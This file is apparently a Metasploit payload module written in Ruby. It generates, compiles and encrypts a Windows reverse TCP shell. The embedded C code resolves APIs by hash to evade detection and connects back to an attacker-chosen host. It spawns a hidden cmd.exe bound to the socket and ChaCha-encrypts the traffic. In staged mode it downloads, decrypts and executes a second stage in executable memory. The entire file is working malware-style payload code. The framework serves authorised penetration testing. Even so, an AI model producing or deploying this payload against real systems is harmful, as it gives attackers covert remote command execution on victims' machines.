# -*- coding: binary -*-

require 'msf/core'
require 'rex/peparsey'
require 'msf/core/payload/uuid/options'
require 'msf/core/payload/windows'
require 'msf/core/payload/windows/encrypted_payload_opts'
require 'msf/core/payload/windows/chacha'
require 'metasploit/framework/compiler/mingw'
require 'rex/crypto/chacha20'

module Msf

###
#
# encrypted reverse tcp payload for Windows
#
###
module Payload::Windows::EncryptedReverseTcp

  include Msf::Payload::UUID::Options
  include Msf::Payload::Windows
  include Msf::Payload::Windows::EncryptedPayloadOpts
  include Msf::Payload::Windows::Chacha


  def initialize(*args)
    super
  end

  def generate(opts={})
    opts[:uuid] ||= generate_payload_uuid.puid_hex
    block_count = "\x01\x00\x00\x00"
    iv = block_count + datastore['ChachaNonce']

    conf =
    {
      call_wsastartup: datastore['CallWSAStartup'],
      port:            format_ds_opt(datastore['LPORT']),
      host:            format_ds_opt(datastore['LHOST']),
      key:             datastore['ChachaKey'],
      nonce:           datastore['ChachaNonce'],
      iv:              iv,
      uuid:            opts[:uuid],
      staged:          staged? ? true : false
    }

    src = ''
    if staged?
      src = generate_stager(conf)
    else
      src = generate_c_src(conf)
    end

    compile_opts =
    {
      strip_symbols: datastore['StripSymbols'],
      linker_script: datastore['LinkerScript'],
      align_obj:     datastore['AlignObj'] || '',
      opt_lvl:       datastore['OptLevel'],
      keep_src:      datastore['KeepSrc'],
      keep_exe:      datastore['KeepExe'],
      f_name:        (staged? ? 'reverse_pic_stager.exe' : 'reverse_pic_stageless.exe'),
      arch:          self.arch_to_s
    }

    comp_code = get_compiled_shellcode(src, compile_opts)
    save_to_db(conf)

    comp_code
  end

  def initial_code
    src = headers
    src << align_rsp if self.arch_to_s.eql?('x64')

    if staged?
      src << chacha_func_staged
    else
      src << chacha_func
    end
    src << exit_proc
  end

  def generate_stager(conf)
    src = initial_code

    if conf[:call_wsastartup]
      src << init_winsock
    end

    src << comm_setup
    src << get_load_library(conf[:host], conf[:port])
    src << call_init_winsock if conf[:call_wsastartup]
    src << start_comm(conf[:uuid])
    src << stager_comm
  end

  def uuid_hex
    true
  end

  def include_send_uuid
    true
  end

  def generate_stage(opts)
    conf = opts[:datastore]
    conf[:staged] = true
    key, nonce = get_key_nonce(opts[:uuid])

    unless key && nonce
      print_status('No existing key/nonce in db. Resorting to datastore options.')
      key = conf['ChachaKey']
      nonce = conf['ChachaNonce']
    end
    iv = "\x01\x00\x00\x00" + nonce

    comp_opts =
    {
      strip_symbols: false,
      linker_script: datastore['LinkerScript'],
      align_obj:     datastore['AlignObj'] || '',
      keep_src:      datastore['KeepSrc'],
      keep_exe:      datastore['KeepExe'],
      f_name:        'reverse_pic_stage.exe',
      arch:          self.arch_to_s
    }

    src = initial_code
    src << get_new_key
    src << init_proc
    src << exec_payload_stage
    shellcode = get_compiled_shellcode(src, comp_opts)

    Rex::Crypto.chacha_encrypt(key, iv, shellcode)
  end

  def generate_c_src(conf)
    src = initial_code

    if conf[:call_wsastartup]
      src << init_winsock
    end

    src << comm_setup
    src << get_new_key
    src << init_proc
    src << get_load_library(conf[:host], conf[:port])
    src << call_init_winsock if conf[:call_wsastartup]
    src << start_comm(conf[:uuid])
    src << single_comm
  end

  def get_hash(lib, func)
    Rex::Text.block_api_hash(lib, func)
  end

  def get_compiled_shellcode(src, opts={})
    Metasploit::Framework::Compiler::Mingw.compile_c(src, opts)

    comp_file = "#{Msf::Config.install_root}/#{opts[:f_name]}"
    return print_error('Payload did not compile') unless File.exist?("#{Msf::Config.install_root}/#{opts[:f_name]}")
    bin = read_exe(comp_file)
    bin = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(bin))

    text_section = bin.sections.first
    text_section = text_section._isource

    Metasploit::Framework::Compiler::Mingw.cleanup_files(opts)
    text_section.rawdata
  end

  def read_exe(file)
    bin = IO.binread(file)

    bin.strip
  end

  #
  # Options such as the LHOST and PORT
  # need to become a null-terminated array
  # to ensure they exist in the .text section.
  #
  def format_ds_opt(opt)
    modified = ''

    opt = opt.to_s
    opt.split('').each { |elem| modified << "\'#{elem}\', " }
    modified = "#{modified}0"
  end

  def headers
    %Q^
      #include "winsock_util.h"
      #include "payload_util.h"
      #include "kernel32_util.h"

      #include "chacha.h"
    ^
  end

  def align_rsp
    %Q^
      extern VOID AlignRSP();
    ^
  end

  def chacha_func_staged
    %Q^
      char *chacha_data(char *buf, int len, char *key, char *nonce)
      {
        chacha_ctx ctx;
        chacha_keysetup(&ctx, key, 256, 96);
        chacha_ivsetup(&ctx, nonce);

        chacha_encrypt_bytes(&ctx, buf, buf, len);
        buf[len] = '\\0';

        return buf;
      }
    ^
  end

  def chacha_func
    %Q^
      char *chacha_data(char *buf, int len, char *key, char *nonce)
        {
          chacha_ctx ctx;
          chacha_keysetup(&ctx, key, 256, 96);
          chacha_ivsetup(&ctx, nonce);

          FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
          char *out = VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_READWRITE);
          chacha_encrypt_bytes(&ctx, buf, out, len);
          out[len] = '\\0';
          return out;
        }
    ^
  end

  def exit_proc
    %Q^
      UINT ExitProc()
      {
        DWORD term_status;
        FuncGetCurrentProcess GetCurrentProcess = (FuncGetCurrentProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GetCurrentProcess')}); // hash('kernel32.dll', 'GetCurrentProcess') -> 0x51e2f352
        FuncGetExitCodeProcess GetExitCodeProcess = (FuncGetExitCodeProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GetExitCodeProcess')}); // hash('kernel32.dll', 'GetExitCodeProcess' -> 0xee54785f

        HANDLE curr_proc_handle = GetCurrentProcess();
        GetExitCodeProcess(curr_proc_handle, &term_status);

        return term_status;
      }
    ^
  end

  def init_winsock
    %Q^
      void init_winsock()
      {
        WSADATA wsadata;
        FuncWSAStartup WSAInit;
        UINT term_proc_status = ExitProc();
        FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0

        WSAInit = (FuncWSAStartup) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'WSAStartup')}); // hash('ws2_32.dll', 'WSAStartup') -> 0x006B8029
        if(WSAInit(MAKEWORD(2, 2), &wsadata))
        {
          ExitProcess(term_proc_status);
        }
      }

    ^
  end

  def comm_setup
    %Q^
      struct addrinfo *conn_info_setup(char *i, char *p)
      {
        UINT term_proc_stat = ExitProc();
        struct addrinfo hints, *results = NULL, *first = NULL;
        FuncGetAddrInfo GetAddrInf = (FuncGetAddrInfo) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'getaddrinfo')}); // hash('ws2_32.dll', 'getaddrinfo') -> 0x14f1f695
        FuncFreeAddrInfo FreeAddrInf = (FuncFreeAddrInfo) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'freeaddrinfo')}); // hash('ws2_32.dll', 'freeaddrinfo') -> 0x150784f5
        FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0

        SecureZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        if(GetAddrInf(i, p, &hints, &results))
        {
          ExitProcess(term_proc_stat);
        }

        first = results;
        if(first == NULL)
        {
          FreeAddrInf(results);
          ExitProcess(term_proc_stat);
        }

        return first;
      }
    ^
  end

  def get_new_key
    %Q^
      char *get_new_key(SOCKET s)
      {
        FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
        FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')});

        char *received = VirtualAlloc(NULL, 45, MEM_COMMIT, PAGE_READWRITE);
        int recv_num = RecvData(s, received, 44, 0);

        received[44] = '\\0';
        return received;
      }
    ^
  end

  def init_proc
    %Q^
      HANDLE* init_process(SOCKET s)
      {
        char cmd[] = { 'c', 'm', 'd', 0 };
        STARTUPINFO si;
        SECURITY_ATTRIBUTES sa;
        PROCESS_INFORMATION pi;
        UINT proc_stat = ExitProc();
        HANDLE out_rd, out_wr, in_rd, in_wr;
        FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0

        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&sa, sizeof(sa));
        SecureZeroMemory(&pi, sizeof(pi));

        si.cb = sizeof(si);
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;

        FuncCreatePipe CreatePipe = (FuncCreatePipe) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'CreatePipe')}); // hash('kernel32.dll', 'CreatePipe') -> 0xeafcf3e
        CreatePipe(&out_rd, &out_wr, &sa, 0);
        CreatePipe(&in_rd, &in_wr, &sa, 0);

        FuncSetHandleInformation SetHandleInformation = (FuncSetHandleInformation) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'SetHandleInformation')}); // hash('kernel32.dll', 'SetHandleInformation') -> 0x1cd313ca
        SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(in_wr, HANDLE_FLAG_INHERIT, 0);

        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdError = si.hStdOutput = out_wr;
        si.hStdInput = in_rd;

        FuncCreateProcess CreateProcess = (FuncCreateProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'CreateProcessA')}); // hash('kernel32.dll', 'CreateProcess') -> 0x863fcc79
        if(!CreateProcess(NULL, cmd, &sa, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
          ExitProcess(proc_stat);
        }

        FuncCloseHandle CloseHandle = (FuncCloseHandle) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'CloseHandle')}); // hash('kernel32.dll', 'CloseHandle') -> 0x528796c6
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        FuncGlobalAlloc GlobalAlloc = (FuncGlobalAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalAlloc')}); // hash('kernel32.dll', 'GlobalAlloc') -> 0x520f76f6
        HANDLE *handle_arr = GlobalAlloc(GMEM_FIXED, sizeof(HANDLE) * 2);

        handle_arr[0] = out_rd;
        handle_arr[1] = in_wr;

        return handle_arr;
      }

      void communicate(HANDLE out, HANDLE in, SOCKET s)
      {
        DWORD data = 0;
        char buf[512];
        int buf_size = 512;
        int new_key = 0;
        DWORD bytes_received = 0;
        FuncSleep Sleep = (FuncSleep) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'Sleep')}); // hash('kernel32.dll', 'Sleep') -> 0xe035f044
        FuncSend SendData = (FuncSend) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'send')}); // hash('ws2_32.dll', 'send') -> 0x5f38ebc2
        FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
        FuncReadFile ReadFile = (FuncReadFile) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ReadFile')}); // hash('kernel32.dll', 'ReadFile') -> 0xbb5f9ead
        FuncWriteFile WriteFile = (FuncWriteFile) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'WriteFile')}); // hash('kernel32.dll', 'WriteFile') -> 0x5bae572d
        FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0
        FuncPeekNamedPipe PeekNamedPipe = (FuncPeekNamedPipe) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'PeekNamedPipe')}); // hash('kernel32.dll', 'PeekNamedPipe') -> 0xb33cb718
        FuncVirtualFree VirtualFree = (FuncVirtualFree) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualFree')}); // hash('kernel32.dll', 'VirtualFree') -> 0x300f2f0b

        SecureZeroMemory(buf, buf_size);
        UINT term_stat = ExitProc();
        char init_key[] = { #{format_ds_opt(datastore['ChachaKey'])} };
        char init_nonce[] = { #{format_ds_opt(datastore['ChachaNonce'])} };
        char *key = init_key;
        char *nonce = init_nonce;

        do
        {
          if(new_key == 0)
          {
            char *stream = get_new_key(s);
            if(stream == NULL)
            {
              ExitProcess(term_stat);
            }

            char *res = chacha_data(stream, 44, key, nonce);
            key = res + 12;
            nonce = res;
            new_key = 1;
          }

          if(PeekNamedPipe(out, NULL, 0, NULL, &data, NULL) && data > 0)
          {
            if(!ReadFile(out, buf, buf_size-1, &bytes_received, NULL))
            {
              ExitProcess(term_stat);
            }
            char *cmd = chacha_data(buf, bytes_received, key, nonce);
            SendData(s, cmd, bytes_received, 0);
            SecureZeroMemory(buf, buf_size);
            VirtualFree(cmd, bytes_received+1, MEM_RELEASE);
          }
          else
          {
            DWORD bytes_written = 0;

            bytes_received = RecvData(s, buf, buf_size-1, 0);
            if(bytes_received > 0)
            {
              char *dec_cmd = chacha_data(buf, bytes_received, key, nonce);
              WriteFile(in, dec_cmd, bytes_received, &bytes_written, NULL);
              SecureZeroMemory(buf, buf_size);
              VirtualFree(dec_cmd, bytes_received+1, MEM_RELEASE);
            }
          }
          Sleep(100);
        } while(bytes_received > 0);
      }

    ^
  end

  #
  # ExecutePayload acts as the main function of the c program
  #
  def get_load_library(host, port)
    %Q^
      void ExecutePayload(VOID)
      {
        FuncLoadLibraryA LoadALibrary;
        FuncWSASocketA WSASock;
        FuncWSACleanup WSACleanup;
        FuncConnect ConnectSock;
        UINT proc_term_status = ExitProc();
        SOCKET conn_socket = INVALID_SOCKET;
        FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0
        FuncCloseHandle CloseHandle = (FuncCloseHandle) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'CloseHandle')}); // hash('kernel32.dll', 'CloseHandle') -> 0x528796c6

        char ip[] = { #{host} };
        char port[] = { #{port} };
        char ws2[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };

        LoadALibrary = (FuncLoadLibraryA) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'LoadLibraryA')}); // hash('kernel32.dll', 'LoadLibrary') -> 0x0726774C
        LoadALibrary((LPTSTR) ws2);
      ^
  end

  def call_init_winsock
    %Q^
        init_winsock();
    ^
  end

  def start_comm(uuid)
    %Q^
        struct addrinfo *info = NULL;
        info = conn_info_setup(ip, port);
        FuncSend SendData = (FuncSend) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'send')}); // hash('ws2_32.dll', 'send') -> 0x5f38ebc2
        WSASock = (FuncWSASocketA) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'WSASocketA')}); // hash('ws2_32.dll', 'WSASocketA') -> 0xe0df0fea
        conn_socket = WSASock(info->ai_family, info->ai_socktype, info->ai_protocol, NULL, 0, 0);

        if(conn_socket == INVALID_SOCKET)
        {
          ExitProcess(proc_term_status);
        }

        ConnectSock = (FuncConnect) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'connect')}); // hash('ws2_32.dll', 'connect') -> 0x6174a599
        if(ConnectSock(conn_socket, info->ai_addr, info->ai_addrlen) == SOCKET_ERROR)
        {
          ExitProcess(proc_term_status);
        }

        char uuid[] = { #{format_ds_opt(uuid)} };
        SendData(conn_socket, uuid, 16, 0);

      ^
   end

  def single_comm
    %Q^  
        HANDLE *comm_handles = init_process(conn_socket);
        communicate(*(comm_handles), *(comm_handles+1), conn_socket);

        CloseHandle(*comm_handles);
        CloseHandle(*(comm_handles + 1));
        WSACleanup = (FuncWSACleanup) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'WSACleanup')}); // hash('ws2_32.dll', 'WSACleanup') -> 0xf44a6e2b
      }
    ^
  end

  def stager_comm
    reg = self.arch_to_s.eql?('x86') ? 'edi' : 'rdi'
    inst = self.arch_to_s.eql?('x86') ? 'movl' : 'movq'

    %Q^
        FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
        unsigned int stage_size;
        int recvd = RecvData(conn_socket, (char *) &stage_size, 4, 0);
        if(recvd != 4)
        {
          ExitProcess(proc_term_status);
        }

        FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll', 'VirtualAlloc') -> 0xe553a458
        register char *received = VirtualAlloc(NULL, stage_size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        int recv_stg = RecvData(conn_socket, received, stage_size, 0);
        if(recv_stg != stage_size)
        {
          ExitProcess(proc_term_status);
        }

        char key[] = { #{format_ds_opt(datastore['ChachaKey'])} };
        char nonce[] = { #{format_ds_opt(datastore['ChachaNonce'])} };
        chacha_data(received, stage_size + 1, key, nonce);
        // hand the socket to the stage
        asm("#{inst} %0, %%#{reg}"
            :
            : "r" (conn_socket)
            : "%#{reg}"
        );

        // call the stage
        void (*func)() = (void(*)())received;
        func();
      }
    ^
  end

  def exec_payload_stage
    reg = self.arch_to_s.eql?('x86') ? 'edi' : 'rdi'
    inst = self.arch_to_s.eql?('x86') ? 'movl' : 'movq'

    %Q^
     void ExecutePayload()
     {
       SOCKET conn_socket = INVALID_SOCKET;

       asm("#{inst} %%#{reg}, %0"
           :
           :"m"(conn_socket)
       );

       HANDLE *comm_handles = init_process(conn_socket);
       communicate(*(comm_handles), *(comm_handles+1), conn_socket);
     } 
    ^
  end
end
end
